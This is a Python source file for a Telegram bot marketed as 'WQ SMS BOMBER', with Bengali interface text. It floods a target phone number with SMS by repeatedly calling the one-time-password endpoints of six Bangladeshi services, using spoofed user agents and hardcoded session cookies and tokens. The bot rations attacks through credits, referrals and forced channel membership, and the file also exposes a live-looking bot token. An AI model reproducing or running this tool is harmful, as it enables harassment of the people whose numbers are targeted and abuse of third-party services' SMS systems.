import os
import random
import threading
import time
from flask import Flask
import requests
import telebot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton

# আপনার টেলিগ্রাম বট টোকেন
TOKEN = "9170879282:AAESbi5FBohsHoVvrs4t-kblWKfULticg4s"
bot = telebot.TeleBot(TOKEN)

# ── আপনার অ্যাডমিন চ্যাট আইডি ──
ADMIN_CHAT_ID = 8087857994

# ── আপনার অফিশিয়াল চ্যানেল ইউজারনেম (যেখানে জয়েন করা বাধ্যতামূলক) ──
CHANNEL_USERNAME = "@WQchanneloft"

# ডাটাবেজ (মেমোরিতে থাকবে)
user_credits = {}  # {chat_id: credit_amount}
user_hits = {}  # {chat_id: total_bombing_hits}

# রেন্ডারের পোর্ট রিকোয়ারমেন্ট পূরণের জন্য ফ্লাস্ক ওয়েব সার্ভার
app = Flask(__name__)


@app.route("/")
def home():
  return "Oustad Bot is Live and Running!"


# ইউজার এজেন্ট পুল
USER_AGENT_DATA = {
    "user_agent": [
        (
            "Mozilla/5.0 (Linux; Android 10; SM-T595"
            " Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko)"
            " Chrome/156.0.8078.47 Safari/537.36"
        ),
        (
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
        ),
        (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)"
            " AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2"
            " Mobile/15E148 Safari/604.1"
        ),
    ]
}


class Bomber:

  def __init__(self, user_mobile, number_of_messege, chat_id):
    self.user_mobile = user_mobile
    self.number_of_messege = number_of_messege
    self.chat_id = chat_id

  def getUserAgent(self):
    return random.choice(USER_AGENT_DATA["user_agent"])

  def aroggo(self):
    url = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.0.0&os=Android&osv=13"
    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.arogga.com",
        "referer": "https://www.arogga.com/",
        "user-agent": self.getUserAgent(),
        "x-requested-with": "mark.via.gp",
    }
    payload = {"mobile": self.user_mobile, "fcmToken": "", "referral": ""}
    try:
      r = requests.post(url, data=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        return True
    except:
      pass
    return False

  def grameenphone(self):
    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
    headers = {
        "Host": "webloginda.grameenphone.com",
        "User-Agent": self.getUserAgent(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.grameenphone.com",
        "X-Requested-With": "mark.via.gp",
        "Referer": "https://www.grameenphone.com/",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    payload = {"msisdn": self.user_mobile, "source": "gp_web"}
    try:
      r = requests.post(url, data=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        res_json = r.json()
        if res_json.get("status") == True:
          return True
    except:
      pass
    return False

  def bdtickets(self):
    url = "https://apiv1.bdtickets.com/api/v1/auth/otp/send"
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "x-platform": "web",
        "x-channel": "direct",
        "origin": "https://bdtickets.com",
        "referer": "https://bdtickets.com/",
        "user-agent": self.getUserAgent(),
        "x-requested-with": "mark.via.gp",
        "authorization": (
            "Bearer"
            " eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uX2lkIjoiYTNiZWE3OTAtZjcxOC00NjU4LTg5OTctYzM1MzRhMmEzYzNhIiwiaXNfYW5vbnltb3VzIjp0cnVlLCJ0b2tlbl92ZXJzaW9uIjoxLCJyb2xlcyI6W10sInBlcm1pc3Npb25zIjpbXSwianRpIjoiNWNkNjE3NTMtMjBlYS00YzU0LWExMjctMzBjYzU1YjBjOTg1IiwiaWF0IjoxNzkzNjQ2OTEzLCJleHAiOjE3OTQyNTE3MTN9.Rn2jSWG5MWA5LPI7DDAyvb0tFy37QrSg9aUkKm_oI3k"
        ),
    }
    phone_num = self.user_mobile
    if not phone_num.startswith("+88"):
      if phone_num.startswith("88"):
        phone_num = "+" + phone_num
      else:
        phone_num = "+88" + phone_num

    payload = {"phone": phone_num}
    try:
      r = requests.post(url, json=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        res_json = r.json()
        if res_json.get("success") == True:
          return True
    except:
      pass
    return False

  def vision_resend(self):
    url = "https://vision.com.bd/api/backend/api/v1/auth/resend-phone-verification"
    headers = {
        "Host": "vision.com.bd",
        "User-Agent": self.getUserAgent(),
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Origin": "https://vision.com.bd",
        "Referer": "https://vision.com.bd/register?callbackUrl=%2Fdashboard",
        "X-Requested-With": "mark.via.gp",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    payload = {
        "phone": self.user_mobile
    }
    try:
      r = requests.post(url, json=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        res_json = r.json()
        if res_json.get("success") == True:
          return True
    except:
      pass
    return False

  def soho_affiliates(self):
    url = "https://sohojaffiliates.com/MobileVarifiedForRegistration"
    headers = {
        "Host": "sohojaffiliates.com",
        "User-Agent": self.getUserAgent(),
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://sohojaffiliates.com/registration",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
    }
    cookies = {
        "parent_id": "eyJpdiI6IlBoRkxFQXgyQkxmTElJZVlVQXNJYnc9PSIsInZhbHVlIjoiMFRXWk1kT1hTWEcwRy9LSklJekg5cHVYS1cySEUxblM1UVJ5bVJ2b0YrOFAyY29TU3YyaW5nQmVaOWRpWkt0SiIsIm1hYyI6ImRkNTBmMWY0MTVmNzU3MTBjYjgxMWIxNWY4M2QzN2JiNzdiZWY3MWEyMDI3M2Y0N2IyYWVjNmVkMzhlNGNjMDMiLCJ0YWciOiIifQ%3D%3D",
        "referrer_user": "eyJpdiI6ImxlSDZwWnkvZmY2UWQ1QmNBUFU5VFE9PSIsInZhbHVlIjoiUVZ2a2VCOHREYXhHT1ltNkxXY2NuMXBFVUF1ZjFMRDFsOGg4MEFxRHEveTdaNFhsVnlmMDNRRndlOEc3emxtbSIsIm1hYyI6ImMwNzNlYmZmYmI1NWMzZThkZDY4NTgwY2UwNGNiNmIyMjAxZjJkOGVmYmVkZjFlY2ExMTQyMTUzYjM0Yzk0YTkiLCJ0YWciOiIifQ%3D%3D",
        "XSRF-TOKEN": "eyJpdiI6Ilg4WEEwa3ZEWXlaOUsxZ2ZSTCtmclE9PSIsInZhbHVlIjoiR0pkeGE0MlZaS0NBM0hPQWxQcm4rdks5cHRIV21MR2dVQ0hHSHp2akxnMEJSdnRNWVRQSmxoa2YzQm55WlpiVmdCYVlQR1VBYXVid0lCaTBlK2xzNkc2dGRlUzF1cWpsSjB2NDMvNDFRVXZJUXcyeURjTDBudXk1MEMwakJwMUciLCJtYwciOiJmODdiMzVkMGMyZmZmNDRlNWRkOTViMjJlNDk1ZmYwZjg1MWJiNmE0NTY4ODFjZGQwODI2YjM0MDdjYjRiYjY5IiwidGFnIjoiIn0%3D",
        "laravel_session": "eyJpdiI6IlBTWFAzOW9TVXdnQlk4TS82SlB0K2c9PSIsInZhbHVlIjoidVgwT0F3ZkR4bnRHdGRkeHowYVZEUTdxRXBBRjhPdnRZQTJqK3Y5azZvd1hseFJPQ1hMcW80MllDVytZSmhBeEFYM3p1ZE9pYTVzRE4yZU05S01NNTM5dnpnSjZjZnplUjE4NmJPT1lpYytwTzlPbXhWd3htdFNqY2lGKzU5VHQiLCJtYWMiOiJmZjQzMWE3OWE4YmY0YmMyZmE1ZTE5YTAwOTQyNDk2MjM0NWM0YWRhMTZkODY1MmUwNDNjYTU5NmIwNGI5ZDVjIiwidGFnIjoiIn0%3D"
    }
    params = {'phone': self.user_mobile, 'otp': '0'}
    try:
      r = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=5)
      if r.status_code == 200:
        res_json = r.json()
        if res_json.get("success") == True:
          return True
    except:
      pass
    return False

  def patakuribd(self):
    url = "https://patakuribd.com/customer/includes/mobile-register.inc.php"
    headers = {
        "Host": "patakuribd.com",
        "User-Agent": self.getUserAgent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://patakuribd.com",
        "Referer": "https://patakuribd.com/customer/signup.php",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "X-Requested-With": "mark.via.gp"
    }
    cookies = {
        "sec_session_id": "ca275e0854fc8e5933a1e074157edbf6"
    }
    payload = {
        'date': '2026-11-05',
        'mobile': self.user_mobile,
        'published': ''
    }
    try:
      r = requests.post(url, data=payload, headers=headers, cookies=cookies, timeout=5)
      if r.status_code == 200:
        return True
    except:
      pass
    return False

  def start(self):
    current_credits = user_credits.get(self.chat_id, 0)
    if current_credits < 1:
      bot.send_message(
          self.chat_id,
          "❌ **পর্যাপ্ত ক্রেডিট নেই!**\nবম্বিং শুরু করতে কমপক্ষে **১ ক্রেডিট** প্রয়োজন。\nদয়া করে `/refer` কমান্ড ব্যবহার করে রেফার করুন অথবা অ্যাডমিনের কাছ থেকে ক্রেডিট রিচার্জ করুন। (কন্টাক্ট)@wqtarik এন্ড সকল আপডেট পেতে আমাদের অফিসিয়াল চ্যানেল এ জয়েন হোন https://t.me/WQchanneloft",
          parse_mode="Markdown",
      )
      return

    user_credits[self.chat_id] -= 1
    if self.chat_id in user_hits:
      user_hits[self.chat_id] += 1
    else:
      user_hits[self.chat_id] = 1

    counter = 0
    bot.send_message(
        self.chat_id,
        f"🚀 **Target:** `{self.user_mobile}`\n📊 **Count:** `{self.number_of_messege}`\n⚡ **বম্বিং কার্যক্রম শুরু হয়েছে...**\n💳 কেটে নেওয়া হয়েছে: `1` ক্রেডিট (বাকি: `{user_credits[self.chat_id]}` ক্রেডিট)",
        parse_mode="Markdown",
    )
    
    methods = [
        self.aroggo,
        self.grameenphone,
        self.bdtickets,
        self.vision_resend,
        self.soho_affiliates,
        self.patakuribd,
    ]

    while counter < self.number_of_messege:
      current_methods = list(methods)
      random.shuffle(current_methods)

      for method in current_methods:
        if counter >= self.number_of_messege:
          break
        try:
          success = method()
          if success:
            counter += 1
            bot.send_message(
                self.chat_id,
                f"[+] OTP sent successfully! [{counter}/{self.number_of_messege}]",
            )
            time.sleep(2.5)
          else:
            time.sleep(1)
        except:
          time.sleep(1)

    bot.send_message(
        self.chat_id,
        f"✅ **টাস্ক সম্পন্ন!**\nTarget: `{self.user_mobile}` সফলভাবে শেষ হয়েছে। সকল আপডেট পেতে আমাদের চ্যানেলে জয়েন হন https://t.me/WQchanneloft",
        parse_mode="Markdown",
    )


# ── চ্যানেল সাবস্ক্রিপশন চেক করার ফাংশন ──
def check_subscription(chat_id):
  try:
    member = bot.get_chat_member(CHANNEL_USERNAME, chat_id)
    if member.status in ['creator', 'administrator', 'member']:
      return True
  except Exception as e:
    print(f"Sub check error: {e}")
  return False


# ── অ্যাডমিন কমান্ড: ক্রেডিট দেওয়ার জন্য (/add <chat_id> <amount>) ──
@bot.message_handler(commands=["add"])
def admin_add_credit(message):
  if message.chat.id != ADMIN_CHAT_ID:
    bot.reply_to(message, "❌ আপনার এই কমান্ডটি ব্যবহার করার অনুমতি নেই! @wqtarik")
    return

  parts = message.text.split()
  if len(parts) < 3:
    bot.reply_to(
        message,
        "[-] সঠিক ফরম্যাট দিন: `/add <chat_id> <amount>`",
        parse_mode="Markdown",
    )
    return

  try:
    target_uid = int(parts[1])
    amount = int(parts[2])

    if target_uid in user_credits:
      user_credits[target_uid] += amount
    else:
      user_credits[target_uid] = amount

    bot.reply_to(
        message,
        f"✅ সফলভাবে ইউজার `{target_uid}`-কে `{amount}` ক্রেডিট দেওয়া হয়েছে。\nবর্তমান ব্যালেন্স: `{user_credits[target_uid]}` ক্রেডিট。",
        parse_mode="Markdown",
    )

    try:
      bot.send_message(
          target_uid,
          f"🎉 **অভিনন্দন!** অ্যাডমিন আপনার অ্যাকাউন্টে `{amount}` ক্রেডিট রিচার্জ করেছেন। @wqtarik\nআপনার বর্তমান মোট ক্রেডিট: `{user_credits[target_uid]}` টি।",
          parse_mode="Markdown",
      )
    except:
      pass

  except ValueError:
    bot.reply_to(message, "[-] চ্যাট আইডি এবং পরিমাণ সংখ্যায় হতে হবে!")


# ── অ্যাডমিন কমান্ড: ইউজার লিস্ট, ক্রেডিট ও হিট দেখার জন্য (/user) ──
@bot.message_handler(commands=["user"])
def admin_user_stats(message):
  if message.chat.id != ADMIN_CHAT_ID:
    bot.reply_to(message, "❌ আপনার এই কমান্ডটি ব্যবহার করার অনুমতি নেই! @wqtarik")
    return

  if not user_credits:
    bot.reply_to(message, "📊 এই মুহূর্তে কোনো ইউজারের ডাটা নেই।")
    return

  stats_text = (
      "👑 **Oustad Admin Panel - User List & Stats** 👑\n\n"
      f"👥 মোট ইউজার: `{len(user_credits)}` জন\n\n"
  )

  for idx, (uid, creds) in enumerate(user_credits.items(), 1):
    hits = user_hits.get(uid, 0)
    stats_text += (
        f"{idx}. Chat ID: `{uid}` | Credit: `{creds}` টি | Total Hits: `{hits}` বার\n"
    )

  bot.send_message(message.chat.id, stats_text, parse_mode="Markdown")


# ── অ্যাডমিন কমান্ড: সব ইউজারের কাছে নোটিশ পাঠানোর জন্য (/note <message>) ──
@bot.message_handler(commands=["note"])
def admin_broadcast_note(message):
  if message.chat.id != ADMIN_CHAT_ID:
    bot.reply_to(message, "❌ আপনার এই কমান্ডটি ব্যবহার করার অনুমতি নেই! @wqtarik")
    return

  parts = message.text.split(maxsplit=1)
  if len(parts) < 2:
    bot.reply_to(
        message,
        "[-] সঠিক ফরম্যাট দিন: `/note <আপনার মেসেজ>`",
        parse_mode="Markdown",
    )
    return

  broadcast_msg = parts[1]
  
  success_count = 0
  fail_count = 0

  status_msg = bot.reply_to(message, "📤 **ব্রডকাস্ট মেসেজ পাঠানো শুরু হয়েছে...**", parse_mode="Markdown")

  all_users = set(list(user_credits.keys()) + list(user_hits.keys()))

  for uid in all_users:
    try:
      bot.send_message(
          uid,
          f"📢 **অ্যাডমিন নোটিশ / আপডেট:**\n\n{broadcast_msg}",
          parse_mode="Markdown",
      )
      success_count += 1
      time.sleep(0.3)
    except Exception as e:
      fail_count += 1

  bot.edit_message_text(
      f"✅ **ব্রডকাস্ট সম্পন্ন!**\n\n"
      f"👥 সফলভাবে পাঠানো হয়েছে: `{success_count}` জনের কাছে\n"
      f"❌ ফেইল হয়েছে: `{fail_count}` জনের কাছে",
      chat_id=message.chat.id,
      message_id=status_msg.message_id,
      parse_mode="Markdown"
  )












# ── রেফারেল লিংক পাওয়ার কমান্ড (/refer) ──
@bot.message_handler(commands=["refer"])
def refer_command(message):
  chat_id = message.chat.id
  
  if not check_subscription(chat_id):
    send_channel_join_required(chat_id)
    return

  bot_info = bot.get_me()
  bot_username = bot_info.username
  refer_link = f"https://t.me/{bot_username}?start={chat_id}"

  # 👇 এখানে কোটেশনের আগে 'f' দেওয়া হয়েছে এবং ব্র্যাকেটের ভেতরের ভেরিয়েবল কাজ করবে
  text = (
      "👥 **Refer & Earn Program** 👥\n\n"
      "আপনার বন্ধুদের এই বটে রেফার করুন! ক্রেডিট নেওয়ার জন্য @wqtarik এবং সকল আপডেট পেতে আমাদের চ্যানেলে জয়েন হন https://t.me/WQchanneloft\n\n"
      "সফল রেফারে আপনি পাবেন **১ ক্রেডিট** করে ফ্রি।\n\n"
      "🔗 আপনার রেফারেল লিংক:\n"
      f"`{refer_link}`"
  )
  bot.send_message(message.chat.id, text, parse_mode="Markdown")





# ── ফিক্সড রিপ্লাই কিবোর্ড (নতুন আপডেট এবং রেফার বাটনসহ) ──
def get_reply_keyboard():
  markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
  btn_bomb = KeyboardButton("🚀 Start Bombing")
  btn_status = KeyboardButton("📊 Bot Status")
  btn_help = KeyboardButton("ℹ️ Help & Info")
  btn_update = KeyboardButton("🔄 বট আপডেট করুন")
  btn_refer = KeyboardButton("🎁 refer করে ক্রেডিট নিন")  # <--- নতুন বাটন
  btn_dev = KeyboardButton("👑 Oustad Panel")
  
  # কিবোর্ডে বাটনগুলো সুন্দরভাবে সাজিয়ে দেওয়া হলো
  markup.add(btn_bomb, btn_status, btn_help, btn_update, btn_refer, btn_dev)
  return markup



# চ্যানেল জয়েন না করলে যে মেসেজ ও বাটন দেখাবে
def send_channel_join_required(chat_id):
  markup = InlineKeyboardMarkup()
  btn_channel = InlineKeyboardButton("📢 Join Channel", url="https://t.me/WQchanneloft")
  btn_check = InlineKeyboardButton("✅ Joined & Verify", callback_data="verify_join")
  markup.add(btn_channel)
  markup.add(btn_check)

  text = (
      "⚠️ **বট ব্যবহার করতে হলে অবশ্যই আমাদের অফিসিয়াল চ্যানেলে জয়েন করতে হবে!**\n\n"
      "১. প্রথমে নিচে `📢 Join Channel` বাটনে ক্লিক করে আমাদের চ্যানেলে জয়েন করুন.সমস্যা হলে কন্টাক্ট করুন@wqtarik সাতে \n"
      "২. এরপর `✅ Joined & Verify` বাটনে ক্লিক করে ভেরিফাই করুন."
  )
  bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")


# ইনলাইন বাটনের ভেরিফিকেশন হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_callback(call):
  chat_id = call.message.chat.id
  if check_subscription(chat_id):
    bot.answer_callback_query(call.id, "✅ ভেরিফিকেশন সফল হয়েছে!", show_alert=True)
    try:
      bot.delete_message(chat_id, call.message.message_id)
    except:
      pass
    send_welcome_after_verify(chat_id, call.message.text)
  else:
    bot.answer_callback_query(call.id, "❌ আপনি এখনো চ্যানেলে জয়েন করেননি! অনুগ্রহ করে জয়েন করুন।", show_alert=True)


def send_welcome_after_verify(chat_id, raw_text=""):
  if chat_id not in user_credits:
    user_credits[chat_id] = 2
    if chat_id not in user_hits:
      user_hits[chat_id] = 0

  welcome_text = (
      "🔥 *স্বাগতম ওস্তাদ! WQ SMS BOMBER প্যানেলে. হেল্প পেতে @wqtarik কন্টাক্ট করুন *\n\n"
      "🎁 নতুন জয়েনিং বোনাস: **২ ক্রেডিট ফ্রি!**\n"
      f"💳 আপনার বর্তমান ক্রেডিট: `{user_credits[chat_id]}` টি\n\n"
      "নিচের ফিক্সড কিবোর্ড থেকে আপনার প্রয়োজনীয় অপশনটি সিলেক্ট করুন:"
  )
  bot.send_message(
      chat_id,
      welcome_text,
      reply_markup=get_reply_keyboard(),
      parse_mode="Markdown",
  )


@bot.message_handler(commands=["start"])
def send_welcome(message):
  chat_id = message.chat.id
  args = message.text.split()

  if not check_subscription(chat_id):
    send_channel_join_required(chat_id)
    return

  if chat_id not in user_credits:
    user_credits[chat_id] = 2  
    if chat_id not in user_hits:
      user_hits[chat_id] = 0

    if len(args) > 1:
      try:
        referrer_id = int(args[1])
        if referrer_id != chat_id and referrer_id in user_credits:
          user_credits[referrer_id] += 1
          bot.send_message(
              referrer_id,
              "🎉 **অভিনন্দন!** আপনার রেফারেল লিংকের মাধ্যমে একজন নতুন ইউজার জয়েন করেছে। আপনি **১ ক্রেডিট** বোনাস পেয়েছেন! ক্রেডিট আরও নিতে@wqtarik কন্টাক্ট করুন ",
              parse_mode="Markdown",
          )
      except ValueError:
        pass

  welcome_text = (
      "🔥 *স্বাগতম ওস্তাদ! WQ SMS BOMBER প্যানেল এ 🚀।হেল্প বা ক্রেডিট নিতে @wqtarik কন্টাক্ট করুন .*\n\n"
      "🎁 নতুন জয়েনিং বোনাস: **২ ক্রেডিট ফ্রি!**\n"
      f"💳 আপনার বর্তমান ক্রেডিট: `{user_credits[chat_id]}` টি\n\n"
      "নিচের ফিক্সড কিবোর্ড থেকে আপনার প্রয়োজনীয় অপশনটি সিলেক্ট করুন:"
  )
  bot.send_message(
      message.chat.id,
      welcome_text,
      reply_markup=get_reply_keyboard(),
      parse_mode="Markdown",
  )


@bot.message_handler(func=lambda message: True)
def handle_text_buttons(message):
  chat_id = message.chat.id
  
  if not check_subscription(chat_id):
    send_channel_join_required(chat_id)
    return

  text = message.text

  if text == "🚀 Start Bombing":
    current_bal = user_credits.get(chat_id, 0)
    msg = bot.send_message(
        chat_id,
        f"💳 আপনার বর্তমান ক্রেডিট: `{current_bal}` টি\n\n📱 অনুগ্রহ করে টার্গেট মোবাইল নম্বরটি দিন (যেমন: `013XXXXXXXX`):",
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )
    bot.register_next_step_handler(msg, process_mobile_step)

  elif text == "📊 Bot Status":
    current_bal = user_credits.get(chat_id, 0)
    hits = user_hits.get(chat_id, 0)
    bot.send_message(
        chat_id,
        (
            f"🟢 **Bot Status:** Online & Active\n💳 **Your Credits:** `{current_bal}` টি\n⚡ **Your Total Hits:** `{hits}` বার\n🚀 **APIs Loaded:** none, Patakuribd\n⚡ **Speed:** High Performance"
        ),
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )

  elif text == "ℹ️ Help & Info":
    bot.send_message(
        chat_id,
        (
            "ℹ️ **কীভাবে ব্যবহার করবেন:**\n\n১. `🚀 Start Bombing` বাটনে ক্লিক করুন.\n২. টার্গেট নম্বর দিন.\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন (প্রতিবার বম্বিংয়ে মাত্র **১ ক্রেডিট** কাটা হবে ক্রেডিট নিতে বা কুনু সমস্যা হলে @wqtarik কন্টাক্ট করুন )."
        ),
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )

  elif text == "🔄 বট আপডেট করুন":
    # লোডিং অ্যানিমেশন শুরু
    msg = bot.send_message(chat_id, "🔄 **বট আপডেট শুরু হচ্ছে...**\n`[░░░░░░░░░░] 0%`", parse_mode="Markdown")
    
    steps = [
        ("🔄 **ফাইল ও ডেটা সিঙ্ক হচ্ছে...**\n`[██░░░░░░░░] 20%`", 0.4),
        ("⚙️ **নতুন ফিচার লোড হচ্ছে...**\n`[█████░░░░░] 50%`", 0.4),
        ("🚀 **এপিআই কানেকশন চেক করা হচ্ছে...**\n`[████████░░] 80%`", 0.4),
        ("✨ **আপডেট সফল হয়েছে! রিলোড হচ্ছে...**\n`[██████████] 100%`", 0.5)
    ]

    for text_content, delay in steps:
      time.sleep(delay)
      try:
        bot.edit_message_text(text_content, chat_id=chat_id, message_id=msg.message_id, parse_mode="Markdown")
      except:
        pass

    time.sleep(0.3)
    try:
      bot.delete_message(chat_id, msg.message_id)
    except:
      pass

    # ১০০% হওয়ার পর অটোমেটিক /start কমান্ডের মতো ওয়েলকাম মেনু রিলোড করে দেওয়া
    send_welcome(message)

  # ── 👇 এই অংশটুকু যুক্ত করা হলো ──
  elif text == "🎁 refer করে ক্রেডিট নিন":
    refer_command(message)
  # ── 👆 যুক্ত করা শেষ ──

  elif text == "👑 Oustad Panel":
    bot.send_message(
        chat_id,
        (
            "👑 **Developer:** WQ OWNER @wqtarik (ওস্তাদ)\n⚡ **Brand:** https://t.me/WQchanneloft\n🌐 **Hosted on:**none"
        ),
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )


def process_mobile_step(message):
  target_mobile = message.text.strip()
  if target_mobile in [
      "🚀 Start Bombing",
      "📊 Bot Status",
      "ℹ️ Help & Info",
      "🔄 বট আপডেট করুন",
      "🎁 refer করে ক্রেডিট নিন",  # ── 👇 এখানেও বাটন নাম যোগ করা হলো ──
      "👑 Oustad Panel",
  ]:
    return

  msg = bot.send_message(
      message.chat.id,
      f"✅ টার্গেট নম্বর: `{target_mobile}`\n\n🔢 এবার কতগুলো মেসেজ পাঠাতে চান তা সংখ্যায় লিখুন (যেমন: `10` বা `50`):",
      reply_markup=get_reply_keyboard(),
      parse_mode="Markdown",
  )
  bot.register_next_step_handler(msg, process_count_step, target_mobile)



def process_count_step(message, target_mobile):
  try:
    count = int(message.text.strip())
    b = Bomber(target_mobile, count, message.chat.id)
    threading.Thread(target=b.start).start()
  except ValueError:
    bot.send_message(
        message.chat.id,
        "[-] ভুল সংখ্যা দিয়েছেন! দয়া করে সঠিক সংখ্যা লিখুন।",
        reply_markup=get_reply_keyboard(),
    )


def run_telegram_bot():
  bot.infinity_polling()


if __name__ == "__main__":
  threading.Thread(target=run_telegram_bot, daemon=True).start()
  port = int(os.environ.get("PORT", 5000))
  app.run(host="0.0.0.0", port=port)
